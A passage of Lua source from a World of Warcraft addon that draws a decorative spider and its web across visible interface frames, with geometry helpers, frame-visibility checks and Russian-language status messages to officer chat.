    self:SendOfficer(string.format(
        "Скорость %s-%s, размер %s, целей %s-%s, сейчас %d",
        tostring(C.SPIDER_SPEED_MIN),
        tostring(C.SPIDER_SPEED_MAX),
        tostring(C.SPIDER_SIZE),
        tostring(C.TARGET_COUNT_MIN),
        tostring(C.TARGET_COUNT_MAX),
        currentThreads
    ))

    local descriptions = self.ConstantDescriptions
    local changed = {}

    for key, defValue in pairs(self.DefaultConstants) do
        if key ~= "SURVIVAL_CHANCE" then
            local label = nil

            if type(descriptions) == "table"
                and type(descriptions[key]) == "string"
                and descriptions[key] ~= "" then
                label = descriptions[key]
            end

            if label then
                local curValue = C[key]

                if type(curValue) == "number"
                    and curValue == curValue
                    and type(defValue) == "number"
                    and defValue == defValue then
                    local diff = curValue - defValue

                    if math.abs(diff) > 1e-9 then
                        local valueText

                        if type(self.FormatConstantValue) == "function" then
                            valueText = self:FormatConstantValue(key, curValue)
                        else
                            valueText = tostring(curValue)
                        end

                        changed[#changed + 1] = {
                            key = key,
                            text = label .. ": " .. valueText,
                        }
                    end
                end
            end
        end
    end

    table.sort(changed, function(a, b)
        return a.key < b.key
    end)

    if #changed > 0 then
        local prefix = "Павук: изменено: "
        local line = prefix
        local limit = 190

        for _, item in ipairs(changed) do
            local addition = item.text

            if line == prefix then
                line = prefix .. addition
            else
                if #line + #addition + 2 > limit then
                    self:SendOfficer(line)
                    line = prefix .. addition
                else
                    line = line .. ", " .. addition
                end
            end
        end

        if line ~= prefix then
            self:SendOfficer(line)
        end
    end

    -- 4. Выживаемость паучка
    local survival = tonumber(C.SURVIVAL_CHANCE) or 0

    if type(survival) ~= "number" or survival ~= survival then
        survival = 0
    end

    if survival < 0 then
        survival = 0
    elseif survival > 1 then
        survival = 1
    end

    self:SendOfficer(string.format(
        "Выживаемость: %.1f%%",
        survival * 100
    ))

    -- 5. Рекорд сессии и опыт за рекорды
    self:SendOfficer(string.format(
        "Рекорд сессии: %d милиметров, учтено опыта за рекорды: %d",
        session.bestPoints or 0,
        session.bestExpAwarded or 0
    ))
end

function NSPauk:AnnounceSpiderKill()
    self:SendOfficer("Я зверски убиваю павука..тапкой!")
end

function NSPauk:GetScreenSize()
    local sw = GetScreenWidth and GetScreenWidth() or 0
    local sh = GetScreenHeight and GetScreenHeight() or 0

    if sw and sh and sw > 0 and sh > 0 then
        return sw, sh
    end

    if UIParent then
        local uw, uh = UIParent:GetWidth(), UIParent:GetHeight()
        if uw and uh and uw > 0 and uh > 0 then
            return uw, uh
        end
    end

    return 1, 1
end

function NSPauk:RandomFloat(min, max)
    min = tonumber(min) or 0
    max = tonumber(max) or min

    if min > max then
        min, max = max, min
    end

    return min + math.random() * (max - min)
end

function NSPauk:RandomInt(min, max)
    min = math.floor((tonumber(min) or 0) + 0.5)
    max = math.floor((tonumber(max) or 0) + 0.5)

    if min > max then
        min, max = max, min
    end

    if min == max then
        return min
    end

    return math.random(min, max)
end

function NSPauk:Bz(t, a, b, c)
    local m = 1 - t
    return m * m * a + 2 * m * t * b + t * t * c
end

function NSPauk:BzThread(thread, t)
    return self:Bz(t, thread.p0.x, thread.p1.x, thread.p2.x),
        self:Bz(t, thread.p0.y, thread.p1.y, thread.p2.y)
end

function NSPauk:ApproxThreadLength(thread)
    if not thread or not thread.p0 or not thread.p2 then
        return 1
    end

    local dx = thread.p2.x - thread.p0.x
    local dy = thread.p2.y - thread.p0.y
    local chord = math.sqrt(dx * dx + dy * dy)

    if not thread.p1 then
        return math.max(chord, 1)
    end

    local d1x = thread.p1.x - thread.p0.x
    local d1y = thread.p1.y - thread.p0.y
    local d2x = thread.p2.x - thread.p1.x
    local d2y = thread.p2.y - thread.p1.y

    local net = math.sqrt(d1x * d1x + d1y * d1y)
        + math.sqrt(d2x * d2x + d2y * d2y)

    return math.max((chord + net) / 2, 1)
end

function NSPauk:Shuffle(tbl)
    for i = #tbl, 2, -1 do
        local j = math.random(i)
        tbl[i], tbl[j] = tbl[j], tbl[i]
    end
    return tbl
end

function NSPauk:EdgePoint(rect, tx, ty)
    local cx = rect.cx
    local cy = rect.cy
    local dx = tx - cx
    local dy = ty - cy

    if dx == 0 and dy == 0 then
        return cx, cy
    end

    local sx, sy

    if dx == 0 then
        sx = 1e9
    else
        local half = (dx > 0) and (rect.right - cx) or (cx - rect.left)
        sx = half / math.abs(dx)
    end

    if dy == 0 then
        sy = 1e9
    else
        local half = (dy > 0) and (rect.top - cy) or (cy - rect.bottom)
        sy = half / math.abs(dy)
    end

    local s = math.min(sx, sy)
    if not s or s < 0 then
        s = 0
    end

    return cx + dx * s, cy + dy * s
end

function NSPauk:PointSegDist2(px, py, ax, ay, bx, by)
    local vx = bx - ax
    local vy = by - ay
    local wx = px - ax
    local wy = py - ay

    local c1 = wx * vx + wy * vy
    if c1 <= 0 then
        return wx * wx + wy * wy
    end

    local c2 = vx * vx + vy * vy
    if c1 >= c2 then
        local dx = px - bx
        local dy = py - by
        return dx * dx + dy * dy
    end

    local t = c1 / c2
    local projX = ax + vx * t
    local projY = ay + vy * t

    local dx = px - projX
    local dy = py - projY

    return dx * dx + dy * dy
end

function NSPauk:EffAlpha(f)
    if f.GetEffectiveAlpha then
        return f:GetEffectiveAlpha() or 1
    end
    return 1
end

function NSPauk:EffScale(f)
    local s = (f.GetEffectiveScale and f:GetEffectiveScale()) or 1
    if not s or s <= 0 then
        s = 1
    end
    return s
end

function NSPauk:VisibleTexture(r)
    local tex = r:GetTexture()
    if not tex or tex == "" then
        return false
    end

    local ra = (r.GetAlpha and r:GetAlpha()) or 1
    if ra <= 0.01 then
        return false
    end

    local _, _, _, va = r:GetVertexColor()
    if (va or 1) <= 0.01 then
        return false
    end

    return true
end

function NSPauk:VisibleText(r)
    local text = (r.GetText and r:GetText()) or nil
    if not text or text == "" then
        return false
    end

    if r.GetFont and not r:GetFont() then
        return false
    end

    local ra = (r.GetAlpha and r:GetAlpha()) or 1
    return ra > 0.01
end

function NSPauk:VisibleBackdrop(f)
    if not f.GetBackdrop then
        return false
    end

    local bd = f:GetBackdrop()
    if not bd then
        return false
    end

    if bd.bgFile and bd.bgFile ~= "" then
        if f.GetBackdropColor then
            local _, _, _, ba = f:GetBackdropColor()
            if (ba or 1) > 0.01 then
                return true
            end
        end
    end

    if bd.edgeFile and bd.edgeFile ~= "" then
        if f.GetBackdropBorderColor then
            local _, _, _, ea = f:GetBackdropBorderColor()
            if (ea or 1) > 0.01 then
                return true
            end
        end
    end

    return false
end

function NSPauk:DisplayName(f)
    local name = f.GetName and f:GetName()
    if name then
        return name
    end

    local p = f.GetParent and f:GetParent()
    local pn = p and p.GetName and p:GetName()

    return "(" .. (pn or "?") .. ")"
end

function NSPauk:NP_GetAnchorFamily(name)
    if type(name) ~= "string" or name == "" then
        return nil
    end

    if name:find("^ChatFrame%d+$") then
        return "ChatFrame"
    end

    return nil
end

function NSPauk:NP_FindFamilyFrame(family, preferFrame)
    if family ~= "ChatFrame" then
        return preferFrame
    end

    if preferFrame
        and preferFrame.IsVisible
        and preferFrame:IsVisible() then
        return preferFrame
    end

    for i = 1, 10 do
        local f = _G["ChatFrame" .. i]

        if f
            and f ~= preferFrame
            and f.IsVisible
            and f:IsVisible() then
            return f
        end
    end

    return preferFrame
end

function NSPauk:ComputeFrameVisibleRect(f, uiScale, baseX, baseY, scrW, scrH)
    local C = self.C

    if not f or f == UIParent or f == WorldFrame then
        return nil
    end

    if self.F_HIGH and f == self.F_HIGH then
        return nil
    end

    local name = f.GetName and f:GetName()

    if name and C.EXCLUDE_FRAMES[name] then
        return nil
    end

    if not f.IsVisible or not f:IsVisible() then
        return nil
    end

    local fa = self:EffAlpha(f)
    if fa < 0.02 then
        return nil
    end

    if not uiScale then
        uiScale = self:EffScale(UIParent)
    end

    if not baseX then
        baseX = (UIParent.GetLeft and UIParent:GetLeft() or 0) * uiScale
    end

    if not baseY then
        baseY = (UIParent.GetBottom and UIParent:GetBottom() or 0) * uiScale
    end

    if not scrW then
        scrW = ((GetScreenWidth and GetScreenWidth()) or UIParent:GetWidth() or 1) * uiScale
    end

    if not scrH then
        scrH = ((GetScreenHeight and GetScreenHeight()) or UIParent:GetHeight() or 1) * uiScale
    end

    local fs = self:EffScale(f)

    local draws = false
    local ul, ur, ub, ut

    local function grow(l, r, b, t)
        if not ul then
            ul, ur, ub, ut = l, r, b, t
        else
            if l < ul then
                ul = l
            end
            if r > ur then
                ur = r
            end
            if b < ub then
                ub = b
            end
            if t > ut then
                ut = t
            end
        end

        draws = true
    end

    if self:VisibleBackdrop(f) then
        local l, r, b, t = f:GetLeft(), f:GetRight(), f:GetBottom(), f:GetTop()

        if l and r and b and t then
            grow(l * fs, r * fs, b * fs, t * fs)
        end
    end

    local fallbackUsed = false

    if f.GetRegions then
        for _, region in ipairs({ f:GetRegions() }) do
            if region.IsVisible and region:IsVisible() then
                local kind = region:GetObjectType()
                local ok = false

                if kind == "Texture" then
                    ok = self:VisibleTexture(region)
                elseif kind == "FontString" then
                    ok = self:VisibleText(region)
                end

                if ok then
                    local l, r2, b, t

                    if region.GetLeft then
                        l = region:GetLeft()
                        r2 = region:GetRight()
                        b = region:GetBottom()
                        t = region:GetTop()
                    end

                    if l and r2 and b and t then
                        grow(l * fs, r2 * fs, b * fs, t * fs)
                    elseif not fallbackUsed then
                        local fl, fr, fb, ft = f:GetLeft(), f:GetRight(), f:GetBottom(), f:GetTop()

                        if fl and fr and fb and ft then
                            fallbackUsed = true
                            grow(fl * fs, fr * fs, fb * fs, ft * fs)
                        end
                    end
                end
            end
        end
    end

    if not draws then
        return nil
    end

    local w = ur - ul
    local h = ut - ub

    if w < C.MIN_ANCHOR_SIZE or h < C.MIN_ANCHOR_SIZE then
        return nil
    end

    if ur < baseX or ul > baseX + scrW or ut < baseY or ub > baseY + scrH then
        return nil
    end

    local rawName = self:DisplayName(f)
    local family = self:NP_GetAnchorFamily(rawName)

    return {
        name = family or rawName,
        family = family,
        left = (ul - baseX) / uiScale,
        right = (ur - baseX) / uiScale,
        bottom = (ub - baseY) / uiScale,
        top = (ut - baseY) / uiScale,
        width = w / uiScale,
        height = h / uiScale,
    }
end

function NSPauk:MakeInnerRect(r)
    local C = self.C

    local w = r.right - r.left
    local h = r.top - r.bottom

    if w < C.MIN_ANCHOR_SIZE or h < C.MIN_ANCHOR_SIZE then
        return nil
    end

    local ix = w * 0.10
    local iy = h * 0.10

    local left = r.left + ix
    local right = r.right - ix
    local bottom = r.bottom + iy
    local top = r.top - iy

    local iw = right - left
    local ih = top - bottom

    if iw < C.MIN_INNER_SIZE or ih < C.MIN_INNER_SIZE then
        return nil
    end

    return {
        name = r.name,
        family = r.family,
        left = left,
        right = right,
        bottom = bottom,
        top = top,
        width = iw,
        height = ih,
        cx = (left + right) / 2,
        cy = (bottom + top) / 2,
    }
end

function NSPauk:ComputeFrameVisibleInner(frame)
    if type(self.C) ~= "table" or type(self.C.MIN_ANCHOR_SIZE) ~= "number" then
        self:LoadConstants()
    end

    if frame == UIParent then
        local sw, sh = self:GetScreenSize()

        if type(sw) ~= "number" or sw <= 0 then
            sw = 1
        end

        if type(sh) ~= "number" or sh <= 0 then
            sh = 1
        end

        local raw = {
            name = "UIParent",
            left = 0,
            right = sw,
            bottom = 0,
            top = sh,
            width = sw,
            height = sh,
            cx = sw / 2,
            cy = sh / 2,
        }

        local inner = self:MakeInnerRect(raw)

        if inner then
            inner.frame = UIParent
            inner.name = "UIParent"
        end

        return inner
    end

    local rect = self:ComputeFrameVisibleRect(frame)
    if not rect then
        return nil
    end

    return self:MakeInnerRect(rect)
end

function NSPauk:MakeUIParentCocoonItem()
    if not UIParent then
        return nil
    end

    local inner = self:ComputeFrameVisibleInner(UIParent)

    if inner then
        inner.frame = UIParent
        inner.name = "UIParent"
        return inner
    end

    local sw, sh = self:GetScreenSize()

    if type(sw) ~= "number" or sw <= 0 then
        sw = 1
    end

    if type(sh) ~= "number" or sh <= 0 then
        sh = 1
    end

    local left = sw * 0.10
    local right = sw * 0.90
    local bottom = sh * 0.10
    local top = sh * 0.90

    return {
        name = "UIParent",
        frame = UIParent,
        left = left,
        right = right,
        bottom = bottom,
        top = top,
        width = right - left,
        height = top - bottom,
        cx = sw / 2,
        cy = sh / 2,
    }
end

function NSPauk:CollectCocoonCandidates(items, excludeActive)
    local good = {}
    local all = {}

    for _, item in ipairs(items or {}) do
        if item and item.frame then
            local ok = true

            if excludeActive and self:IsActiveAnchorFrame(item.frame) then
                ok = false
            end

            if ok then
                all[#all + 1] = item

                if self:IsGoodAnchorName(item.name) then
                    good[#good + 1] = item
                end
            end
        end
    end

    local pool = good
    if #pool == 0 then
        pool = all
    end

    local ui = self:MakeUIParentCocoonItem()

    if ui then
        local hasUIParent = false

        for _, item in ipairs(pool) do
            if item.frame == UIParent then
                hasUIParent = true
                break
            end
        end

        if not hasUIParent then
            if not excludeActive or not self:IsActiveAnchorFrame(UIParent) then
                pool[#pool + 1] = ui
            end
        end
    end

    return pool
end

function NSPauk:CollectVisibleItems()
    local C = self.C

    local items = {}

    local uiScale = self:EffScale(UIParent)

    local baseX = (UIParent.GetLeft and UIParent:GetLeft() or 0) * uiScale
    local baseY = (UIParent.GetBottom and UIParent:GetBottom() or 0) * uiScale

    local scrW = ((GetScreenWidth and GetScreenWidth()) or UIParent:GetWidth() or 1) * uiScale
    local scrH = ((GetScreenHeight and GetScreenHeight()) or UIParent:GetHeight() or 1) * uiScale

    local f = EnumerateFrames()

    while f do
        local rect = self:ComputeFrameVisibleRect(f, uiScale, baseX, baseY, scrW, scrH)

        if rect then
            local inner = self:MakeInnerRect(rect)

            if inner then
                inner.frame = f
                inner.name = rect.name
                items[#items + 1] = inner
            end
        end

        if #items >= C.MAX_VISIBLE_RECTS then
            break
        end

        f = EnumerateFrames(f)
    end

    if #items < C.MAX_VISIBLE_RECTS then
        local webItems = self:NP_CollectWebAnchorItems()

        for _, item in ipairs(webItems) do
            if #items >= C.MAX_VISIBLE_RECTS then
                break
            end

            items[#items + 1] = item
        end
    end

    return items
end

function NSPauk:IsGoodAnchorName(name)
    if type(name) ~= "string" or name == "" then
        return false
    end
    if name:sub(1, 1) == "(" then
        return false
    end
    if name == "WorldFrame" or name == "UIParent" or name == "MinimapCluster" then
        return false
    end

    if name:find("Moth", 1, true) then
        return false
    end
    if name:find("NSPauk_Moth", 1, true) then
        return false
    end

    return true
end

function NSPauk:MakeSag(thread, mode, hubX, hubY)
    if not thread or not thread.p0 or not thread.p2 then
        return
    end
    local C = self.C
    local D = self.DefaultConstants
    local p0 = thread.p0
    local p2 = thread.p2
    local dx = p2.x - p0.x
    local dy = p2.y - p0.y
    local len = math.sqrt(dx * dx + dy * dy)
    local mx = (p0.x + p2.x) / 2
    local my = (p0.y + p2.y) / 2
    if len < 1 then
        thread.p1 = {
            x = mx,
            y = my - 0.5,
        }
        return
    end
    local minSag
    local maxSag
    local jitter
    if mode == "main" then
        minSag = C.MAIN_SAG_MIN or D.MAIN_SAG_MIN
        maxSag = C.MAIN_SAG_MAX or D.MAIN_SAG_MAX
        jitter = 0.06
    else
        minSag = C.CROSS_SAG_MIN or D.CROSS_SAG_MIN
        maxSag = C.CROSS_SAG_MAX or D.CROSS_SAG_MAX
        jitter = 0.08
    end
    local ratio = self:RandomFloat(minSag, maxSag)
    if type(ratio) ~= "number" or ratio ~= ratio or ratio <= 0 then
        ratio = 0.10
    end
    local sag = len * ratio
    if type(sag) ~= "number" or sag ~= sag or sag <= 0 then
        sag = math.max(len * 0.10, 0.5)
    elseif sag < 0.5 then
        sag = 0.5
    end
    local offsetX = (math.random() - 0.5) * len * jitter
    thread.p1 = {
        x = mx + offsetX,
        y = my - sag,
    }
    if thread.p1.y >= my then
        thread.p1.y = my - sag
    end
end

function NSPauk:BuildArcSamples(thread)
    local C = self.C
    local samples = {}
    local total = 0

    local prevX, prevY = self:BzThread(thread, 0)
    samples[1] = { len = 0, t = 0 }

    local n = C.ARC_SAMPLES
    if n < 16 then
        n = 16
    end

    for i = 1, n do
        local t = i / n
        local x, y = self:BzThread(thread, t)

        local dx = x - prevX
        local dy = y - prevY

        total = total + math.sqrt(dx * dx + dy * dy)
        samples[i + 1] = { len = total, t = t }

        prevX, prevY = x, y
    end

    return samples, total
end

function NSPauk:ThreadTAtLength(conn, targetLen)
    local samples = conn.arcSamples
    local total = conn.arcLength

    if not samples or not total or total <= 0 then
        return nil
    end

    if targetLen <= 0 then
        return 0
    end

    if targetLen > total + 0.001 then
        return nil
    end

    if targetLen >= total - 0.001 then
        return 1
    end

    local lo = 1
    local hi = #samples

    while lo + 1 < hi do
        local mid = math.floor((lo + hi) / 2)
        if samples[mid].len < targetLen then
            lo = mid
        else
            hi = mid
        end
    end

    local a = samples[lo]
    local b = samples[hi]
    local span = b.len - a.len

    if span <= 0.0001 then
        return a.t
    end

    local f = (targetLen - a.len) / span
    return a.t + (b.t - a.t) * f
end

function NSPauk:MakeRadialThread(hubRect, targetRect, lineIndex, lineCount)
    local C = self.C

    lineIndex = lineIndex or 1
    lineCount = lineCount or 1

    for _ = 1, 10 do
        local tx, ty, hx, hy

        if lineCount > 1 then
            local f = (lineIndex - 1) / (lineCount - 1) - 0.5

            tx = targetRect.cx
                + f * targetRect.width * 0.65
                + (math.random() - 0.5) * targetRect.width * 0.15

            ty = targetRect.cy
                + (math.random() - 0.5) * targetRect.height * 0.65
        else
            tx = targetRect.cx
                + (math.random() - 0.5) * targetRect.width * 0.50

            ty = targetRect.cy
                + (math.random() - 0.5) * targetRect.height * 0.50
        end

        hx = hubRect.cx + (math.random() - 0.5) * hubRect.width * 0.45
        hy = hubRect.cy + (math.random() - 0.5) * hubRect.height * 0.45

        local sx, sy = self:EdgePoint(hubRect, tx, ty)
        local ex, ey = self:EdgePoint(targetRect, hx, hy)

        local dx = ex - sx
        local dy = ey - sy
        local len = math.sqrt(dx * dx + dy * dy)

        if len >= C.MIN_WEB_GAP then
            local thread = {
                p0 = { x = sx, y = sy },
                p2 = { x = ex, y = ey },
            }

            self:MakeSag(thread, "main")

            local ax = sx - hubRect.cx
            local ay = sy - hubRect.cy

            if ax == 0 and ay == 0 then
                ax = targetRect.cx - hubRect.cx
                ay = targetRect.cy - hubRect.cy
            end

            local angle = math.atan2(ay, ax)
            if angle < 0 then
                angle = angle + (2 * math.pi)
            end

            thread.angle = angle
            return thread
        end
    end

    local sx, sy = self:EdgePoint(hubRect, targetRect.cx, targetRect.cy)
    local ex, ey = self:EdgePoint(targetRect, hubRect.cx, hubRect.cy)

    local dx = ex - sx
    local dy = ey - sy
    local len = math.sqrt(dx * dx + dy * dy)

    if len < C.MIN_WEB_GAP then
        return nil
    end

    local thread = {
        p0 = { x = sx, y = sy },
        p2 = { x = ex, y = ey },
    }

    self:MakeSag(thread, "main")

    local angle = math.atan2(targetRect.cy - hubRect.cy, targetRect.cx - hubRect.cx)
    if angle < 0 then
        angle = angle + (2 * math.pi)
    end

    thread.angle = angle
    return thread
end

function NSPauk:CopyRect(r)
    return {
        name = r.name,
        family = r.family,
        frame = r.frame,
        left = r.left,
        right = r.right,
        bottom = r.bottom,
        top = r.top,
        width = r.width,
        height = r.height,
        cx = r.cx,
        cy = r.cy,
    }
end

function NSPauk:NormalizeFallbackRect(r)
    r.width = r.right - r.left
    r.height = r.top - r.bottom
    r.cx = (r.left + r.right) / 2
    r.cy = (r.bottom + r.top) / 2
    r.frame = nil
    return r
end

function NSPauk:PickCentralHub(items)
    local S = self.S

    local cx = S.SW / 2
    local cy = S.SH / 2

    local best = nil
    local bestD = math.huge

    for _, item in ipairs(items) do
        local dx = item.cx - cx
        local dy = item.cy - cy
        local d = dx * dx + dy * dy

        if d < bestD then
            bestD = d
            best = item
        end
    end

    return best
end

function NSPauk:FallbackHubAndTargets()
    local S = self.S

    local SW, SH = self:GetScreenSize()
    S.SW, S.SH = SW, SH

    local hub = self:NormalizeFallbackRect({
        name = "FallbackHub",
        left = SW * 0.44,
        right = SW * 0.56,
        bottom = SH * 0.44,
        top = SH * 0.56,
    })

    local defs = {
        { 0.08, 0.26, 0.68, 0.86 },
        { 0.74, 0.92, 0.68, 0.86 },
        { 0.74, 0.92, 0.14, 0.32 },
        { 0.08, 0.26, 0.14, 0.32 },
    }

    local candidates = {}

    for i, d in ipairs(defs) do
        local target = self:NormalizeFallbackRect({
            name = "FallbackTarget" .. i,
            left = SW * d[1],
            right = SW * d[2],
            bottom = SH * d[3],
            top = SH * d[4],
        })

        candidates[#candidates + 1] = { item = target }
    end

    return hub, candidates, 4
end

function NSPauk:PickWebHub(items)
    if not items or #items == 0 then
        return nil
    end

    local good = {}
    for _, item in ipairs(items) do
        if self:IsGoodAnchorName(item.name) then
            good[#good + 1] = item
        end
    end

    local pool = good
    if #pool == 0 then
        pool = items
    end

    if math.random(1, 2) == 1 then
        local hub = self:PickCentralHub(pool)
        if hub then
            return hub
        end
    end

    return pool[math.random(1, #pool)]
end

function NSPauk:ChooseNextHub(inst)
    if not inst or not inst.anchorCandidates or #inst.anchorCandidates == 0 then
        return nil
    end

    local good = {}
    for _, r in ipairs(inst.anchorCandidates) do
        if self:IsGoodAnchorName(r.name) then
            good[#good + 1] = r
        end
    end

    local source = good
    if #source == 0 then
        source = inst.anchorCandidates
    end

    local list = {}
    for i, r in ipairs(source) do
        list[i] = r
    end

    self:Shuffle(list)

    for _, r in ipairs(list) do
        if r.frame then
            local cur = self:ComputeFrameVisibleInner(r.frame)
            if cur then
                return cur
            end
        elseif r.left and r.right and r.bottom and r.top then
            return self:NormalizeFallbackRect(self:CopyRect(r))
        end
    end

    return nil
end

function NSPauk:CollectTargetCandidates(hub, items)
    local good = {}
    local all = {}
    local function sameAnchor(a, b)
        if not a or not b then
            return false
        end
        if a == b then
            return true
        end
        if a.virtualId and b.virtualId then
            return a.virtualId == b.virtualId
        end
        if a.frame and b.frame then
            return a.frame == b.frame
        end
        return false
    end

    local function isDynamicObject(item)
        if not item then
            return true
        end
        local name = item.name
        if type(name) == "string" then
            if name:find("Moth", 1, true) then
                return true
            end
            if name:find("NSPauk_Moth", 1, true) then
                return true
            end
        end
        if item.frame then
            local frameName = item.frame.GetName and item.frame:GetName()
            if type(frameName) == "string" then
                if frameName:find("Moth", 1, true) then
                    return true
                end
            end
        end
        return false
    end

    for _, item in ipairs(items) do
        if not sameAnchor(item, hub) and not isDynamicObject(item) then
            all[#all + 1] = { item = item }
            if self:IsGoodAnchorName(item.name) then
                good[#good + 1] = { item = item }
            end
        end
    end
    local pool = good
    if #pool == 0 then
        pool = all
    end
    return self:Shuffle(pool)
end

function NSPauk:ValidateAnchorRect(rect)
    if not rect then
        return false
    end

    if rect.webInst then
        return self:NP_IsWebAnchorAlive(rect)
    end

    if not rect.frame then
        return true
    end

    local frame = rect.frame

    if rect.family then
        local live = self:NP_FindFamilyFrame(rect.family, frame)
        if live then
            frame = live
        end
    end

    local S = self.S
    local now = GetTime()
    local tol = tonumber(self.C.MOVEMENT_TOLERANCE) or 2.0

    S.nspAnchorRectCache = S.nspAnchorRectCache or {}

    local entry = S.nspAnchorRectCache[frame]

    if entry
        and entry.rectLeft == rect.left
        and entry.rectRight == rect.right
        and entry.rectBottom == rect.bottom
        and entry.rectTop == rect.top
        and (now - (entry.t or 0)) < 0.25 then
        return entry.ok
    end

    local cur = self:ComputeFrameVisibleInner(frame)

    local ok = false

    if cur then
        ok = math.abs(cur.left - rect.left) <= tol
            and math.abs(cur.right - rect.right) <= tol
            and math.abs(cur.bottom - rect.bottom) <= tol
            and math.abs(cur.top - rect.top) <= tol
    end

    if ok and rect.family and frame ~= rect.frame then
        rect.frame = frame
    end

    S.nspAnchorRectCache[frame] = {
        t = now,
        rectLeft = rect.left,
        rectRight = rect.right,
        rectBottom = rect.bottom,
        rectTop = rect.top,
        ok = ok,
    }

    return ok
end

function NSPauk:ValidateConnection(inst, conn)
    if not inst or not conn or not conn.alive then
        return false
    end

    if not self:ValidateAnchorRect(inst.hub.rect) then
        self:KillConnection(inst, conn)
        return false
    end

    if conn.ringStartRect then
        if not self:ValidateAnchorRect(conn.ringStartRect) then
            self:KillConnection(inst, conn)
            return false
        end
    end

    if conn.isSpoke
        and inst.isNaturalRing
        and inst.hubDepConn
        and not inst.hubDepConn.alive then
        self:KillConnection(inst, conn)
        return false
    end

    if conn.isMidSpoke then
        if conn.perimeterConn and not conn.perimeterConn.alive then
            self:KillConnection(inst, conn)
            return false
        end

        return true
    end

    if not self:ValidateAnchorRect(conn.target.rect) then
        self:KillConnection(inst, conn)
        return false
    end

    return true
end

function NSPauk:InstanceHasAliveConn(inst)
    if not inst then
        return false
    end

    for _, conn in ipairs(inst.conns) do
        if conn.alive then
            return true
        end
    end

    return false
end

function NSPauk:SettleInstance(inst)
    local S = self.S

    if not inst or inst.settled then
        return
    end

    if S.suppressSettle then
        return
    end

    inst.settled = true

    local count = inst.drawnPoints or 0
    if count <= 0 then
        return
    end

end

function NSPauk:CheckInstanceDead(inst)
    if not inst then
        return
    end

    if not self:InstanceHasAliveConn(inst) then
        if not inst.settled then
            self:SettleInstance(inst)
        end
        inst.torn = true
    end
end

function NSPauk:RemoveTornInstances()
    local S = self.S

    for i = #S.instances, 1, -1 do
        local inst = S.instances[i]
        if inst and inst.torn then
            table.remove(S.instances, i)

            if S.currentInstance == inst then
                S.currentInstance = nil
            end
        end
    end
end

function NSPauk:GetOwnerInstance(owner)
    if not owner then
        return nil
    end

    if owner.thread and owner.thread.ownerRef and owner.thread.ownerRef.inst then
        return owner.thread.ownerRef.inst
    end

    if owner.connA
        and owner.connA.thread
        and owner.connA.thread.ownerRef
        and owner.connA.thread.ownerRef.inst then
        return owner.connA.thread.ownerRef.inst
    end

    if owner.connB
        and owner.connB.thread
        and owner.connB.thread.ownerRef
        and owner.connB.thread.ownerRef.inst then
        return owner.connB.thread.ownerRef.inst
    end

    if owner.parentSegA
        and owner.parentSegA.thread
        and owner.parentSegA.thread.ownerRef
        and owner.parentSegA.thread.ownerRef.inst then
        return owner.parentSegA.thread.ownerRef.inst
    end

    if owner.parentSegB
        and owner.parentSegB.thread
        and owner.parentSegB.thread.ownerRef
        and owner.parentSegB.thread.ownerRef.inst then
        return owner.parentSegB.thread.ownerRef.inst
    end

    return nil
end

function NSPauk:SampleThreadPoints(thread, ignoreHubDist)
    local points = {}

    if not thread then
        return points
    end

    local samples, total = self:BuildArcSamples(thread)

    if not total or total <= 0 then
        return points
    end

    if type(ignoreHubDist) ~= "number"
        or ignoreHubDist ~= ignoreHubDist
        or ignoreHubDist < 0 then
        ignoreHubDist = 0
    end

    if total <= ignoreHubDist then
        return points
    end

    local temp = {
        arcSamples = samples,
        arcLength = total,
    }

    local span = total - ignoreHubDist
    local maxPoints = 24

    local step = span / maxPoints

    if step < 8 then
        step = 8
    end

    if step > 64 then
        step = 64
    end

    local len = ignoreHubDist

    while len <= total do
        local t = self:ThreadTAtLength(temp, len)

        if t then
            local x, y = self:BzThread(thread, t)
            points[#points + 1] = { x = x, y = y }
        end

        len = len + step
    end

    local x, y = self:BzThread(thread, 1)
    local last = points[#points]

    if not last or math.abs(last.x - x) > 0.5 or math.abs(last.y - y) > 0.5 then
        points[#points + 1] = { x = x, y = y }
    end

    return points
end

function NSPauk:CreateCrossSegArc(inst, connA, connB, tA, tB, minLen)
    local C = self.C

    local ax, ay = self:BzThread(connA.thread, tA)
    local bx, by = self:BzThread(connB.thread, tB)

    local dx = bx - ax
    local dy = by - ay

    if not minLen or minLen < 0 then
        minLen = C.MIN_CROSS_LEN
    end

    if (dx * dx + dy * dy) < (minLen * minLen) then
        return nil
    end

    local thread = {
        p0 = { x = ax, y = ay },
        p2 = { x = bx, y = by },
    }

    local hubX = (inst.hub.rect and inst.hub.rect.cx) or 0
    local hubY = (inst.hub.rect and inst.hub.rect.cy) or 0

    self:MakeSag(thread, "cross", hubX, hubY)

    local seg = {
        connA = connA,
        connB = connB,
        thread = thread,
        textures = {},
        alive = true,
        t = (tA + tB) / 2,
    }

    thread.ownerRef = {
        inst = inst,
        seg = seg,
    }

    inst.crossSegs[#inst.crossSegs + 1] = seg

    return seg
end

function NSPauk:NP_GetGap()
    local C = self.C or {}

    local size = tonumber(C.SPIDER_SIZE) or 64
    local gap = size * 0.5

    if gap < 8 then
        gap = 8
    end

    return gap
end

function NSPauk:NP_EnsureThreadSamples(thread)
    if not thread then
        return nil
    end

    local count = -1
    local ref = thread.ownerRef

    if ref then
        if ref.conn and ref.conn.textures then
            count = #ref.conn.textures
        elseif ref.seg and ref.seg.textures then
            count = #ref.seg.textures
        end
    end

    local wantedN = 24

    if thread._nspMapSamples
        and (thread._nspMapTexCount ~= count or thread._nspMapSampleN ~= wantedN) then
        thread._nspMapSamples = nil
        thread._nspMapTexCount = nil
        thread._nspMapSampleN = nil
        thread._nspColPts = nil
        thread._nspColIgnore = nil
    end

    if not thread._nspMapSamples then
        local pts = {}

        local p0 = thread.p0
        local p2 = thread.p2
        local p1 = thread.p1

        if not p1 and p0 and p2 then
            p1 = {
                x = (p0.x + p2.x) / 2,
                y = (p0.y + p2.y) / 2,
            }
        end

        if p0 and p1 and p2 then
            for i = 0, wantedN - 1 do
                local t = i / (wantedN - 1)

                local x = self:Bz(t, p0.x, p1.x, p2.x)
                local y = self:Bz(t, p0.y, p1.y, p2.y)

                pts[#pts + 1] = { x = x, y = y }
            end
        end

        thread._nspMapSamples = pts
        thread._nspMapSampleN = wantedN
    end

    thread._nspMapTexCount = count

    return thread._nspMapSamples
end

function NSPauk:NP_NearestThreadT(thread, x, y)
    if not thread or not thread.p0 or not thread.p2 then
        return 0, math.huge
    end

    local p0 = thread.p0
    local p2 = thread.p2

    local p1 = thread.p1 or {
        x = (p0.x + p2.x) / 2,
